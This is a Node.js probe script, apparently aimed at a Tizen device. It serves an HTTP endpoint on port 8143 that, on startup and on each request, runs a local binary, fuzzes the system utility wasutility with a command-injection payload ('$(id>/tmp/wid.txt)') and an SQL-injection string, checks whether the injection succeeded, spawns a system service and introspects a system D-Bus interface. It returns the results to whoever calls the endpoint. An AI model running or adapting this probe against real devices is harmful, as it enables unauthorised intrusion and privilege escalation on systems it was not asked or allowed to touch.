'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8143;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe55h.txt';
var BINARY = '/home/owner/share/tmp/sdk_tools/tzmem_probe';

var INNER = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var result = {};',
  'try { fs.chmodSync("/home/owner/share/tmp/sdk_tools/tzmem_probe", 0755); result.chmod_ok = true; } catch(e) { result.chmod_err = e.message; }',
  'try {',
  '  var out = cp.execSync("/home/owner/share/tmp/sdk_tools/tzmem_probe 2>&1", {timeout:15000});',
  '  result.tzmem_probe = out.toString();',
  '} catch(e) {',
  '  result.tzmem_probe_err = e.message;',
  '  result.tzmem_probe_stderr = e.stderr ? e.stderr.toString() : "";',
  '  result.tzmem_probe_stdout = e.stdout ? e.stdout.toString() : "";',
  '}',
  'var wasArgs = [',
  '  ["activate"],',
  '  ["deactivate"],',
  '  ["--help"],',
  '  ["-h"],',
  '  ["activate", "test"],',
  '  ["activate", "org.tizen.browser"],',
  '  ["activate", "$(id>/tmp/wid.txt)"],',
  '  ["activate", "\'OR 1=1--"]',
  '];',
  'result.wasutility_args = {};',
  'wasArgs.forEach(function(args) {',
  '  var key = args.join(" ");',
  '  try {',
  '    var r = cp.execFileSync("/usr/bin/wasutility", args, {timeout:3000});',
  '    result.wasutility_args[key] = {rc:0, out:r.toString()};',
  '  } catch(e) {',
  '    result.wasutility_args[key] = {rc:e.status||"err", out:(e.stdout?e.stdout.toString():""), err:(e.stderr?e.stderr.toString():e.message)};',
  '  }',
  '});',
  'try { result.cmd_inject_test = fs.existsSync("/tmp/wid.txt") ? fs.readFileSync("/tmp/wid.txt","utf8") : "not_created"; } catch(e) {}',
  'try {',
  '  cp.spawn("/usr/bin/RunningAppsService", [], {detached:true, stdio:"ignore"}).unref();',
  '  result.rnas_spawn = "spawned";',
  '} catch(e) { result.rnas_spawn_err = e.message; }',
  'try { result.dbus_send = cp.execSync("which dbus-send 2>&1; dbus-send --system --print-reply --dest=org.tizen.RunningAppsService /org/tizen/RunningAppsService org.freedesktop.DBus.Introspectable.Introspect 2>&1", {timeout:5000}).toString(); } catch(e) { result.dbus_send_err = e.message.slice(0,200); }',
  'var out = JSON.stringify(result, null, 2);',
  'var fs2 = require("fs");',
  'try { fs2.writeFileSync("/home/owner/share/tmp/sdk_tools/tbprobe55h.txt", out); } catch(e) {}',
  'process.stdout.write(out);'
].join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 60000 }, function(err, stdout, stderr) {
    var result;
    if (err) {
      result = JSON.stringify({ exec_error: err.message, stderr: stderr, stdout: stdout || '' });
    } else {
      result = stdout || '(empty)';
    }
    cb(result);
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(result) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(result);
  });
});

server.listen(PORT, function() {
  runProbe(function(result) {
    try { fs.writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe55h.txt', result); } catch(e) {}
  });
});
